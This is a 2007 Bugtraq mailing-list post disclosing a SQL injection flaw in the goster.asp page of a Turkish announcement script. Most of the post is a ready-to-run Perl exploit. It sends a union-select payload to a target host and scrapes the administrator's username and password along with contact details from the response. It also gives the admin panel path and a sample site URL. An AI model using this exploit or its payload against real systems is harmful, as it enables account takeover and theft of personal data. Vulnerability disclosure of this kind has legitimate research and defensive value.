
Date: 10 Mar 2007 09:05:08 -0000
From: crazy_king@...7.org
To: bugtraq@...urityfocus.com
Subject: F&#305;st&#305;q Duyuru Scripti Remote Sql &#304;njection Exploit

F&#305;st&#305;q Duyuru Scripti Remote Sql &#304;njection

File : goster.asp
Sql  : -1%20union+all+select+0,kullaniciadi,sifre,3+from+admin
Admin Name + Admin Pass
Admin Menu: yoneticiii/default.asp

Thanks : Ajann , Xoron , ApAci , ErNE , Uyuss , Eno7 , Thehacker , Enjexion

.pl Exploit Code :

#!/usr/bin/perl
#[Script Name: F&#305;st&#305;q Duyuru Scripti
#[Coded by   : Cr@...King
#[Author     : Cr@...King
#[Contact    : crazy_king@...7.org
#[S.Page     : http://www.isikkoyu.com/images/yeni/default.asp

use IO::Socket;
if(@ARGV &lt; 1){
print "
[========================================================================
[//   F&#305;st&#305;q Duyuru Scripti Remote Blind SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&amp;Exp : Cr@...King (k)
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/goster.asp?id=";

print "Script &lt;DIR&gt; : ";
$dir = &lt;STDIN&gt;;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
  }


$target = "-1%20union+all+select+0,kullaniciadi,sifre,3+from+admin";

$target = $host.$dir.$file.$target;

#Writing data to socket
print
"+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET-&gt;new(Proto =&gt; "tcp", PeerAddr =&gt; "$server",
PeerPort =&gt; "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = &lt;$socket&gt;) {
if ($answer =~ /name=\"login\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /name=\"password\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Password: $1\n";
}

if ($answer =~ /name=\"name\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Name: $1\n";
}

if ($answer =~ /name=\"email\" size=\"30\" class=\"gray_back\" value=\"(.*?)"
onBlur/){
print "+ Email: $1\n";
}

if ($answer =~ /name=\"address1\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Address1: $1\n";
}

if ($answer =~ /name=\"address2\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Address1: $1\n";
}

if ($answer =~ /name=\"city\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ City: $1\n";
}

if ($answer =~ /name=\"postcode\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ PostCode: $1\n";
}

if ($answer =~ /name=\"county\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Country: $1\n";
}

if ($answer =~ /name=\"phone\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Phone: $1\n";
}

if ($answer =~ /name=\"iurl\" size=\"24\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Fax: $1\n";
}


if ($answer =~ /name=\"title\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\"&gt;/){
print "+ Country: $1\n";
}

if ($answer =~ /Syntax error/) {
print "+ Exploit Failed : ( \n";
print
"+**********************************************************************+\n";
exit();
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print
"+**********************************************************************+\n";
exit();
}
  }
